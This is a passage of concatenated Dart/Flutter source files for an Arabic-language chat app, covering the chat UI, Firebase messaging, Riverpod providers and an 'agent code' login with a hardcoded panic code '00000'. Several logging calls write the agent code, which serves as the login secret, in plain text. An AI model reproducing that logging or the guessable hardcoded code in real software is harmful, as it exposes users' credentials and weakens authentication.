                  chatMessagesStreamProvider(widget.conversationId)),
              style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              ),
            )
          ],
        ),
      ),
    );
  }

  // دالة لعرض حالة الرسائل الفارغة
  Widget _buildEmptyMessagesState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.forum_outlined,
              size: 100,
              color: theme.colorScheme.primary.withOpacity(0.6)),
          const SizedBox(height: 20),
          Text(
            "ابدأ المحادثة!",
            style: GoogleFonts.cairo(
                fontSize: 22,
                color: theme.colorScheme.onSurface,
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "لا توجد رسائل في هذه المحادثة بعد\nأرسل أول رسالة للبدء",
            style: GoogleFonts.cairo(
                fontSize: 16, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 12),
          Icon(
            Icons.arrow_downward_rounded,
            color: theme.primaryColor.withOpacity(0.7),
            size: 32,
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final messagesAsyncValue =
        ref.watch(chatMessagesStreamProvider(widget.conversationId));
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);

    if (_isInitializing) {
      return Scaffold(
        appBar: widget.showAppBar 
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: _buildLoadingState(context),
      );
    }

    if (agentCodeAsync.isLoading ||
        agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      Widget bodyContent;
      if (agentCodeAsync.isLoading) {
        bodyContent = _buildLoadingState(context);
      } else {
        bodyContent = Center(
          child: Padding(
            padding: const EdgeInsets.all(20.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل معلومات المستخدم للدردشة."
                  : "الرجاء تسجيل الدخول لعرض الرسائل.",
              style: GoogleFonts.cairo(fontSize: 16, color: Colors.grey[600]),
              textAlign: TextAlign.center,
            ),
          ),
        );
      }
      return Scaffold(
        appBar: widget.showAppBar
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: bodyContent,
      );
    }

    final currentAgentCode = agentCodeAsync.value!;

    return Scaffold(
      appBar: widget.showAppBar
          ? AppBar(
              title: Text(widget.conversationTitle, style: GoogleFonts.cairo()),
              backgroundColor: theme.appBarTheme.backgroundColor ??
                  theme.colorScheme.primary,
              elevation: theme.appBarTheme.elevation ?? 1.0,
              actions: [
                IconButton(
                  icon: const Icon(Icons.refresh_outlined),
                  tooltip: "تحديث الرسائل",
                  onPressed: () {
                    ref.invalidate(chatMessagesStreamProvider(widget.conversationId));
                    logger.info("ChatScreen",
                        "Manually refreshed messages for ${widget.conversationId}");
                  },
                ),
              ],
            )
          : null, 
      body: Column(
        children: [
          Expanded(
            child: messagesAsyncValue.when(
              data: (messages) {
                if (messages.isEmpty) {
                  return _buildEmptyMessagesState(context);
                }
                return ListView.builder(
                  reverse: true,
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10.0, vertical: 15.0),
                  itemCount: messages.length,
                  itemBuilder: (context, index) {
                    final message = messages[messages.length - 1 - index];
                    return GestureDetector(
                      onLongPress: () =>
                          _onMessageLongPress(context, message, ref),
                      child: MessageBubble(
                        message: message,
                      ),
                    );
                  },
                );
              },
              loading: () => _buildLoadingState(context),
              error: (err, stack) {
                logger.error("ChatScreen:StreamBuilder",
                    "Error UI msg for ${widget.conversationId}", err, stack);
                return _buildErrorState(
                    "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى", ref);
              },
            ),
          ),
          MessageInputBar(
            onSendPressed: (text) async {
              if (text.trim().isNotEmpty) {
                final apiService = ref.read(apiServiceProvider);
                if (apiService == null) {
                  logger.error("ChatScreen:onSendPressed",
                      "ApiService is null. Cannot send message.");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال الرسائل غير متاحة.",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.orangeAccent,
                    ));
                  }
                  return;
                }

                // عرض مؤشر الإرسال
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Row(
                      children: [
                        SizedBox(
                          width: 20, 
                          height: 20, 
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: Colors.white,
                          )
                        ),
                        const SizedBox(width: 12),
                        Text("جاري إرسال الرسالة...", style: GoogleFonts.cairo()),
                      ],
                    ),
                    duration: const Duration(seconds: 1),
                    backgroundColor: theme.primaryColor,
                  ));
                }

                final newMessage = ChatMessage(
                  id: "", 
                  senderId: currentAgentCode,
                  text: text,
                  messageType: MessageType.text,
                  timestamp:
                      DateTime.now(), 
                  isSentByCurrentUser:
                      true, 
                );
                try {
                  await apiService.sendMessage(widget.conversationId, newMessage);
                  logger.info("ChatScreen:onSendPressed",
                      "Sent text msg to ${widget.conversationId}");
                } catch (e, stackTrace) {
                  logger.error("ChatScreen:onSendPressed",
                      "Failed to send text msg", e, stackTrace);
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("فشل إرسال الرسالة، يرجى المحاولة مرة أخرى",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.redAccent,
                    ));
                  }
                }
              } else {
                logger.info("ChatScreen:onSendPressed",
                    "Attempted to send empty text message.");
              }
            },
            onAttachmentPressed: () async {
              final apiService = ref.read(apiServiceProvider);
              if (apiService == null) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "ApiService is null. Cannot send attachment.");
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال المرفقات غير متاحة",
                          style: GoogleFonts.cairo())));
                }
                return;
              }
              try {
                FilePickerResult? result = await FilePicker.platform.pickFiles(
                  type: FileType.any, 
                  withData: true, // Ensure file bytes are loaded for MIME type detection and upload
                );
                if (result != null && result.files.isNotEmpty) {
                  PlatformFile file = result.files.first;
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Picked file: ${file.name}, size: ${file.size}");

                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Row(
                            children: [
                              SizedBox(
                                width: 20, 
                                height: 20, 
                                child: CircularProgressIndicator(
                                  strokeWidth: 2, 
                                  color: Colors.white
                                )
                              ),
                              const SizedBox(width: 12),
                              Text("جارٍ رفع الملف: ${file.name}...",
                                  style: GoogleFonts.cairo()),
                            ],
                          ),
                          duration: const Duration(seconds: 15),
                          backgroundColor: theme.primaryColor,
                      ),
                    );
                  }

                  String? downloadUrl = await apiService.uploadFileToStorage(file, widget.conversationId);
                  
                  if (!context.mounted) return; // Check mounted status after async operation

                  // إغلاق SnackBar الرفع
                  ScaffoldMessenger.of(context).hideCurrentSnackBar();

                  if (downloadUrl == null) {
                     logger.error("ChatScreen:onAttachmentPressed", "Upload failed for ${file.name}");
                     ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                            content: Text("فشل رفع الملف: ${file.name}",
                                style: GoogleFonts.cairo()),
                            backgroundColor: Colors.redAccent,
                        ),
                      );
                    return;
                  }
                  
                  logger.info("ChatScreen:onAttachmentPressed", "File ${file.name} uploaded. URL: $downloadUrl");

                  final newFileMessage = ChatMessage(
                    id: "",
                    senderId: currentAgentCode,
                    text: null, 
                    fileName: file.name,
                    fileUrl: downloadUrl, 
                    fileSize: file.size,
                    messageType: _determineMessageTypeFromFile(file),
                    timestamp: DateTime.now(),
                    isSentByCurrentUser: true,
                  );
                  await apiService.sendMessage(widget.conversationId, newFileMessage);
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Sent file message: ${file.name}");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Text("تم إرسال الملف: ${file.name}",
                              style: GoogleFonts.cairo())),
                    );
                  }
                } else {
                  logger.info("ChatScreen:onAttachmentPressed",
                      "File picking cancelled or no file selected.");
                }
              } catch (e, stackTrace) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "Error picking or sending file", e, stackTrace);
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text("حدث خطأ أثناء معالجة الملف، يرجى المحاولة مرة أخرى",
                        style: GoogleFonts.cairo()),
                    backgroundColor: Colors.redAccent,
                  ));
                }
              }
            },
          ),
        ],
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_service.dart
// ----------------------------------------------------------------------

// import 'package:flutter_riverpod/flutter_riverpod.dart';
// import 'package:uuid/uuid.dart';

// import '../../data/models/chat/chat_conversation.dart';
// import '../../data/models/chat/chat_message.dart';

// class ChatService {
//   final List<ChatConversation> _conversations = [];
//   final Map<String, List<ChatMessage>> _messages = {};
//   final Uuid _uuid = const Uuid();

//   // Get all chat conversations
//   List<ChatConversation> getConversations() {
//     return _conversations;
//   }

//   // Get messages for a specific conversation
//   List<ChatMessage> getMessages(String conversationId) {
//     return _messages[conversationId] ?? [];
//   }

//   // Add a new message to a conversation
//   void addMessage(String conversationId, ChatMessage message) {
//     if (_messages.containsKey(conversationId)) {
//       _messages[conversationId]!.add(message);
//     } else {
//       _messages[conversationId] = [message];
//     }
//   }

//   // Create a new conversation
//   ChatConversation createConversation(String userId, String userName) {
//     final newConversation = ChatConversation(
//       id: _uuid.v4(),
//       userName: userName,
//       lastMessage: '', // Initialize with empty last message
//       timestamp: DateTime.now(),
//     );
//     _conversations.add(newConversation);
//     return newConversation;
//   }
// }

// final chatServiceProvider = Provider((ref) => ChatService());



// ------------------------------ نهاية الملف: chat_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: firebase_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\firebase\firebase_service.dart
// ----------------------------------------------------------------------

import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:file_picker/file_picker.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:uuid/uuid.dart';

import '../../../data/models/chat/chat_conversation.dart';
import '../../../data/models/chat/chat_message.dart';

class FirebaseService {
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final FirebaseStorage _storage = FirebaseStorage.instance;
  final _uuid = Uuid();

  // Initialize Firebase (called after google-services.json is added and Firebase.initializeApp())
  Future<void> initialize() async {
    print(
        "FirebaseService initialized. Ensure Firebase.initializeApp() was called.");
  }

  // User operations
  Future<void> createUserRecord(String userId,
      {Map<String, dynamic>? userData}) async {
    try {
      await _firestore.collection('users').doc(userId).set({
        'userId': userId,
        'createdAt': FieldValue.serverTimestamp(),
        'lastSeen': FieldValue.serverTimestamp(),
        ...?userData,
      });
    } catch (e) {
      print("Error creating user record: $e");
      // Handle error appropriately
    }
  }

  Future<Map<String, dynamic>?> getUserRecord(String userId) async {
    try {
      DocumentSnapshot doc =
          await _firestore.collection('users').doc(userId).get();
      if (doc.exists) {
        return doc.data() as Map<String, dynamic>;
      }
    } catch (e) {
      print("Error fetching user record: $e");
    }
    return null;
  }

  // Chat operations
  Stream<List<ChatConversation>> getChatsStream(String userId) {
    return _firestore
        .collection('chats')
        .where('participants', arrayContains: userId)
        .orderBy('updatedAt', descending: true)
        .snapshots()
        .map((snapshot) => snapshot.docs.map((doc) {
              final data = doc.data();
              return ChatConversation.fromMap({
                'id': doc.id,
                'title': data['title'] ?? 'محادثة جديدة',
                'participants': List<String>.from(data['participants'] ?? []),
                'lastMessage': data['lastMessage'],
                'createdAt': data['createdAt']?.toDate(),
                'updatedAt': data['updatedAt']?.toDate(),
              });
            }).toList());
  }

  Future<String?> createChat(List<String> participantIds,
      {String? title}) async {
    try {
      // Sort participant IDs to create a consistent chat ID
      participantIds.sort();
      String chatId =
          participantIds.join('_'); // Simple way to generate a chat ID

      // Check if chat already exists
      DocumentSnapshot chatDoc =
          await _firestore.collection('chats').doc(chatId).get();
      if (chatDoc.exists) {
        return chatId; // Chat already exists
      }

      await _firestore.collection('chats').doc(chatId).set({
        'participants': participantIds,
        'title': title ?? 'محادثة جديدة',
        'createdAt': FieldValue.serverTimestamp(),
        'updatedAt': FieldValue.serverTimestamp(),
      });
      return chatId;
    } catch (e) {
      print("Error creating chat: $e");
    }
    return null;
  }

  // Message operations
  Stream<List<ChatMessage>> getMessagesStream(String chatId) {
    return _firestore
        .collection('chats')
        .doc(chatId)
        .collection('messages')
        .orderBy('timestamp',
            descending: true) // Or false for chronological order
        .snapshots()
        .map((snapshot) => snapshot.docs.map((doc) {
              final data = doc.data();
              return ChatMessage(
                id: doc.id,
                senderId: data['senderId'] ?? '',
                text: data['text'],
                fileUrl: data['fileUrl'],
                fileName: data['fileName'],
                fileSize: data['fileSize'],
                messageType:
                    _getMessageTypeFromString(data['messageType'] ?? 'text'),
                timestamp: data['timestamp']?.toDate() ?? DateTime.now(),
                isSentByCurrentUser: false, // Will be set by the UI
              );
            }).toList());
  }

  MessageType _getMessageTypeFromString(String type) {
    switch (type) {
      case 'image':
        return MessageType.image;
      case 'video':
        return MessageType.video;
      case 'audio':
        return MessageType.audio;
      case 'file':
        return MessageType.file;
      default:
        return MessageType.text;
    }
  }

  String _getStringFromMessageType(MessageType type) {
    switch (type) {
      case MessageType.image:
        return 'image';
      case MessageType.video:
        return 'video';
      case MessageType.audio:
        return 'audio';
      case MessageType.file:
        return 'file';
      default:
        return 'text';
    }
  }

  Future<void> sendMessage(String chatId, ChatMessage message) async {
    try {
      final messageId = message.id.isEmpty ? _uuid.v4() : message.id;

      await _firestore
          .collection('chats')
          .doc(chatId)
          .collection('messages')
          .doc(messageId)
          .set({
        'senderId': message.senderId,
        'text': message.text,
        'fileUrl': message.fileUrl,
        'fileName': message.fileName,
        'fileSize': message.fileSize,
        'messageType': _getStringFromMessageType(message.messageType),
        'timestamp': FieldValue.serverTimestamp(),
        'isRead': false,
      });

      // Update chat's last message and updatedAt timestamp
      await _firestore.collection('chats').doc(chatId).update({
        'lastMessage': {
          'text': message.text ?? message.fileName ?? 'مرفق',
          'timestamp': FieldValue.serverTimestamp(),
          'senderId': message.senderId,
        },
        'updatedAt': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      print("Error sending message: $e");
      rethrow;
    }
  }

  Future<String?> uploadFileToStorage(PlatformFile file, String chatId) async {
    try {
      if (file.bytes == null && file.path == null) {
        throw Exception("No file data available");
      }

      final fileName = '${DateTime.now().millisecondsSinceEpoch}_${file.name}';
      final storageRef = _storage.ref().child('chats/$chatId/$fileName');

      UploadTask uploadTask;
      if (file.bytes != null) {
        // Upload from memory
        uploadTask = storageRef.putData(file.bytes!);
      } else {
        // Upload from file path
        final fileToUpload = File(file.path!);
        uploadTask = storageRef.putFile(fileToUpload);
      }

      final snapshot = await uploadTask;
      final downloadUrl = await snapshot.ref.getDownloadURL();
      return downloadUrl;
    } catch (e) {
      print("Error uploading file: $e");
      return null;
    }
  }

  Future<void> deleteMessage(String chatId, String messageId) async {
    try {
      await _firestore
          .collection('chats')
          .doc(chatId)
          .collection('messages')
          .doc(messageId)
          .delete();
      // Potentially update lastMessage in chat if this was the last one
    } catch (e) {
      print("Error deleting message: $e");
    }
  }

  Future<void> deleteConversation(String chatId) async {
    try {
      // Delete all messages in the conversation (subcollection)
      var messagesSnapshot = await _firestore
          .collection('chats')
          .doc(chatId)
          .collection('messages')
          .get();
      for (var doc in messagesSnapshot.docs) {
        await doc.reference.delete();
      }
      // Delete the chat document itself
      await _firestore.collection('chats').doc(chatId).delete();
    } catch (e) {
      print("Error deleting conversation: $e");
    }
  }

  Future<void> updateUserLastSeen(String userId) async {
    try {
      await _firestore.collection('users').doc(userId).update({
        'lastSeen': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      print("Error updating user last seen: $e");
    }
  }
}



// ------------------------------ نهاية الملف: firebase_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: auth_providers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\providers\auth_providers.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/providers/auth_providers.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

import '../../../core/logging/logger_provider.dart';

const String agentCodeStorageKey = 'conduit_current_agent_code_v1';

final _secureStorageInstanceProvider = Provider<FlutterSecureStorage>((ref) {
  return const FlutterSecureStorage();
});

final currentAgentCodeProvider = FutureProvider<String?>((ref) async {
  final storage = ref.watch(_secureStorageInstanceProvider);
  final logger = ref.watch(appLoggerProvider);
  logger.info("currentAgentCodeProvider", "Attempting to read agent code with key: $agentCodeStorageKey");
  try {
    final agentCode = await storage.read(key: agentCodeStorageKey);
    if (agentCode != null && agentCode.isNotEmpty) {
      logger.info("currentAgentCodeProvider", "Successfully read agent code: '$agentCode'");
      return agentCode;
    } else {
      logger.info("currentAgentCodeProvider", "No agent code found (null or empty).");
      return null;
    }
  } catch (e, stackTrace) {
    logger.error("currentAgentCodeProvider", "Error reading agent code.", e, stackTrace);
    return null;
  }
});

final isLoggedInProvider = Provider<bool>((ref) {
  final agentCodeAsyncValue = ref.watch(currentAgentCodeProvider);
  return agentCodeAsyncValue.maybeWhen(
    data: (agentCode) => agentCode != null && agentCode.isNotEmpty,
    orElse: () => false,
  );
});

final secureStorageProviderForDecoy = _secureStorageInstanceProvider;

// Define AuthService class
class AuthService {
  final Ref _ref;
  AuthService(this._ref);

  Future<void> signOut() async {
    final logger = _ref.read(appLoggerProvider);
    final storage = _ref.read(secureStorageProviderForDecoy);
    try {
      await storage.delete(key: agentCodeStorageKey);
      _ref.invalidate(currentAgentCodeProvider);
      // In a real app, you might also call Firebase Auth signOut or similar here.
      logger.info("AuthService", "User signed out, agent code deleted.");
    } catch (e, s) {
      logger.error("AuthService", "Error during sign out", e, s);
      // Rethrow to allow callers to handle
      rethrow;
    }
  }

  // Add other auth methods here if needed, e.g., signIn, signUp
  Future<void> signIn(String agentCode) async {
    final logger = _ref.read(appLoggerProvider);
    final storage = _ref.read(secureStorageProviderForDecoy);
    try {
      await storage.write(key: agentCodeStorageKey, value: agentCode);
      _ref.invalidate(currentAgentCodeProvider); // Invalidate to refetch
      logger.info("AuthService", "Agent code '$agentCode' signed in and stored.");
    } catch (e, s) {
      logger.error("AuthService", "Error during sign in for '$agentCode'", e, s);
      rethrow;
    }
  }
}

// Define and export authServiceProvider
final authServiceProvider = Provider<AuthService>((ref) {
  return AuthService(ref);
});



// ------------------------------ نهاية الملف: auth_providers.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_providers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\providers\chat_providers.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/providers/chat_providers.dart
import "package:cloud_firestore/cloud_firestore.dart";
import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
import "package:flutter_riverpod/flutter_riverpod.dart";

import "../../../core/logging/logger_provider.dart";
import "../../../data/models/chat/chat_conversation.dart";
import "../../../data/models/chat/chat_message.dart";
import "../api_service.dart";
import "auth_providers.dart"; // لـ currentAgentCodeProvider

// Provider لـ ApiService - سيكون null حتى يتوفر agentCode
final apiServiceProvider = Provider<ApiService?>((ref) {
  final firestore = FirebaseFirestore.instance;
  final storage = FirebaseStorage.instance; // Add Firebase Storage instance
  final logger =
      ref.watch(appLoggerProvider); // استخدام appLoggerProvider العام
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);

  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        logger.info("apiServiceProvider",
            "Agent code available: $agentCode. Initializing ApiService.");
        // Ensure correct argument order: firestore, storage, logger, agentCode
        return ApiService(firestore, storage, logger, agentCode);
      }
      logger.warn("apiServiceProvider",
          "Agent code is null or empty. ApiService will not be available yet.");
      return null;
    },
    loading: () {
      logger.info("apiServiceProvider",
          "Agent code is loading... ApiService not yet available.");
      return null;
    },
    error: (error, stackTrace) {
      logger.error(
          "apiServiceProvider", "Error loading agent code", error, stackTrace);
      return null;
    },
  );
});

// StreamProvider للمحادثات
final chatConversationsStreamProvider =
    StreamProvider<List<ChatConversation>>((ref) {
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
  final logger = ref.watch(appLoggerProvider);
  final firestore = FirebaseFirestore.instance;
  final storage = FirebaseStorage.instance; // Add Firebase Storage instance

  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        final apiService =
            ref.read(apiServiceProvider); 
        if (apiService != null) {
          return apiService.getConversationsStream();
        }
        logger.warn("chatConversationsStreamProvider",
            "ApiService was null but agentCode is $agentCode. Creating temp instance.");
        // Ensure correct argument order: firestore, storage, logger, agentCode
        final tempApiService = ApiService(firestore, storage, logger, agentCode);
        return tempApiService.getConversationsStream();
      }
      logger.info("chatConversationsStreamProvider",
          "No agent code, returning empty stream for conversations.");
      return Stream.value([]);
    },
    loading: () {
      logger.info("chatConversationsStreamProvider",
          "Agent code loading, returning empty stream for conversations.");
      return Stream.value([]);
    },
    error: (e, s) {
      logger.error(
          "chatConversationsStreamProvider",
          "Error with agent code, returning error stream for conversations.",
          e,
          s);
      return Stream.error(e, s);
    },
  );
});

// StreamProvider للرسائل
final chatMessagesStreamProvider = StreamProvider.autoDispose
    .family<List<ChatMessage>, String>((ref, conversationId) {
  final agentCodeAsync = ref.watch(currentAgentCodeProvider);
  final logger = ref.watch(appLoggerProvider);
  final firestore = FirebaseFirestore.instance;
  final storage = FirebaseStorage.instance; // Add Firebase Storage instance

  return agentCodeAsync.when(
    data: (agentCode) {
      if (agentCode != null && agentCode.isNotEmpty) {
        final apiService = ref.read(apiServiceProvider);
        if (apiService != null) {
          return apiService.getMessagesStream(conversationId);
        }
        logger.warn("chatMessagesStreamProvider",
            "ApiService was null for $conversationId but agentCode is $agentCode. Creating temp instance.");
        // Ensure correct argument order: firestore, storage, logger, agentCode
        final tempApiService = ApiService(firestore, storage, logger, agentCode);
        return tempApiService.getMessagesStream(conversationId);
      }
      logger.info("chatMessagesStreamProvider",
          "No agent code, returning empty stream for messages in $conversationId.");
      return Stream.value([]);
    },
    loading: () {
      logger.info("chatMessagesStreamProvider",
          "Agent code loading, returning empty stream for messages in $conversationId.");
      return Stream.value([]);
    },
    error: (e, s) {
      logger.error(
          "chatMessagesStreamProvider",
          "Error with agent code, returning error stream for messages in $conversationId.",
          e,
          s);
      return Stream.error(e, s);
    },
  );
});




// ------------------------------ نهاية الملف: chat_providers.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: theme_providers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\providers\theme_providers.dart
// ----------------------------------------------------------------------

// lib/presentation/providers/theme_providers.dart
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../../core/settings/theme_service.dart';

// Provider for ThemeService
final themeServiceProvider = Provider<ThemeService>((ref) {
  return ThemeService(); // إنشاء instance من ThemeService
});

// StateNotifierProvider for managing theme state
final themeStateProvider =
    StateNotifierProvider<ThemeNotifier, ThemeState>((ref) {
  // تمرير ThemeService إلى ThemeNotifier
  return ThemeNotifier(ref.watch(themeServiceProvider));
});

class ThemeState {
  final ThemeMode themeMode;
  final Color primaryColor;
  final bool useMaterial3;

  ThemeState({
    required this.themeMode,
    required this.primaryColor,
    required this.useMaterial3,
  });

  // يمكنك حذف dialogBackgroundColor من هنا إذا كنت ستعتمد على ألوان الثيم مباشرة
  // Color get dialogBackgroundColor =>
  //     themeMode == ThemeMode.dark ? const Color(0xFF2C2C2C) : Colors.grey[200]!;

  ThemeState copyWith({
    ThemeMode? themeMode,
    Color? primaryColor,
    bool? useMaterial3,
  }) {
    return ThemeState(
      themeMode: themeMode ?? this.themeMode,
      primaryColor: primaryColor ?? this.primaryColor,
      useMaterial3: useMaterial3 ?? this.useMaterial3,
    );
  }
}

class ThemeNotifier extends StateNotifier<ThemeState> {
  final ThemeService _themeService;
  // اللون الافتراضي يمكن أن يكون من ThemeService أيضًا إذا أردت
  // static const Color intelligencePrimaryColor = Color(0xFF004D40);

  ThemeNotifier(this._themeService) // استقبال ThemeService
      : super(ThemeState(
          themeMode: ThemeMode.system, // القيمة الافتراضية قبل التحميل
          primaryColor: ThemeService
              .intelligencePrimaryColor, // استخدام اللون الافتراضي من ThemeService
          useMaterial3: true, // القيمة الافتراضية قبل التحميل
        )) {
    _loadSettings();
  }

  Future<void> _loadSettings() async {
    final themeMode = await _themeService.loadThemeMode();
    // استخدام دالة loadPrimaryColor من ThemeService التي توفر اللون الافتراضي
    final primaryColor = await _themeService.loadPrimaryColor();
    final useMaterial3 = await _themeService.loadUseMaterial3();

    if (mounted) {
      state = ThemeState(
        themeMode: themeMode,
        primaryColor: primaryColor,
        useMaterial3: useMaterial3,
      );
    }
  }

  void updateThemeMode(ThemeMode mode) {
    if (mode == state.themeMode) return;
    state = state.copyWith(themeMode: mode);
    _themeService.saveThemeMode(mode);
  }

  void updatePrimaryColor(Color color) {
    if (color == state.primaryColor) return;
    state = state.copyWith(primaryColor: color);
    _themeService.savePrimaryColor(color);
  }

  void toggleMaterial3(bool useMaterial3) {
    if (useMaterial3 == state.useMaterial3) return;
    state = state.copyWith(useMaterial3: useMaterial3);
    _themeService.saveUseMaterial3(useMaterial3);
  }
}



// ------------------------------ نهاية الملف: theme_providers.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: auth_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\services\auth_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/services/auth_service.dart
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'dart:io' if (dart.library.html) 'dart:html' show Platform;

import '../../../core/logging/logger_service.dart';
import '../../../core/security/secure_storage_service.dart';

/// خدمة المصادقة المخصصة للتعامل مع رموز الوكلاء
class AuthService {
  final FirebaseFirestore _firestore;
  final LoggerService _logger;
  final SecureStorageService _secureStorage;

  AuthService(this._firestore, this._logger, this._secureStorage);

  /// التحقق من صحة رمز الوكيل مقابل Firestore
  Future<bool> validateAgentCode(String agentCode) async {
    if (agentCode.isEmpty) {
      _logger.warn("AuthService:validateAgentCode", "محاولة التحقق من رمز وكيل فارغ.");
      return false;
    }
    
    _logger.info("AuthService:validateAgentCode", "التحقق من رمز الوكيل: $agentCode مقابل 'agent_identities'");
    
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCode)
          .get();

      if (doc.exists) {
        _logger.info("AuthService:validateAgentCode", "رمز الوكيل '$agentCode' صالح (المستند موجود).");
        return true;
      } else {
        _logger.warn("AuthService:validateAgentCode", "رمز الوكيل '$agentCode' غير صالح (المستند غير موجود).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "AuthService:validateAgentCode",
          "حدث خطأ أثناء التحقق من رمز الوكيل '$agentCode'",
          e,
          s);
      return false;
    }
  }

  /// الحصول على معرف الجهاز
  Future<String?> getDeviceId() async {
    final deviceInfo = DeviceInfoPlugin();
    try {
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        return androidInfo.id;
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        return iosInfo.identifierForVendor;
      }
    } catch (e, s) {
      _logger.error("AuthService:getDeviceId", "فشل في الحصول على معرف الجهاز", e, s);
    }
    return null;
  }

  /// التحقق من رمز الوكيل وربط الجهاز إذا لزم الأمر
  Future<AuthResult> authenticateAgent(String agentCode) async {
    if (agentCode.isEmpty) {
      return AuthResult(
        success: false, 
        message: "الرجاء إدخال الرمز التعريفي",
        errorType: AuthErrorType.emptyCode
      );
    }

    // رقم الهلع - يقوم بإرجاع نجاح مع علامة الهلع
    if (agentCode == "00000") {
      _logger.warn("AuthService:authenticateAgent", "تم إدخال رمز الهلع '00000'! بدء التدمير الذاتي الصامت.");
      return AuthResult(
        success: true,
        message: "تم التحقق بنجاح",
        isPanicCode: true
      );
    }

    // التحقق من صحة الرمز
    final isValidCode = await validateAgentCode(agentCode);
    if (!isValidCode) {
      return AuthResult(
        success: false,
        message: "رمز التعريف غير صحيح. يرجى المحاولة مرة أخرى.",
        errorType: AuthErrorType.invalidCode
      );
    }

    // الحصول على معرف الجهاز
    final deviceId = await getDeviceId();
    if (deviceId == null) {
      _logger.error("AuthService:authenticateAgent", "فشل في الحصول على معرف الجهاز. إحباط تسجيل الدخول.");
      return AuthResult(
        success: false,
        message: "فشل في تحديد هوية الجهاز. لا يمكن المتابعة.",
        errorType: AuthErrorType.deviceIdError
      );
    }

    // الحصول على بيانات الوكيل
    final agentDocRef = _firestore.collection("agent_identities").doc(agentCode);
    final agentDocSnapshot = await agentDocRef.get();

    if (!agentDocSnapshot.exists) {
      _logger.error("AuthService:authenticateAgent", "رمز الوكيل $agentCode صالح ولكن المستند غير موجود. تناقض حرج.");
      return AuthResult(
        success: false,
        message: "خطأ في بيانات العميل.",
        errorType: AuthErrorType.dataInconsistency
      );
    }

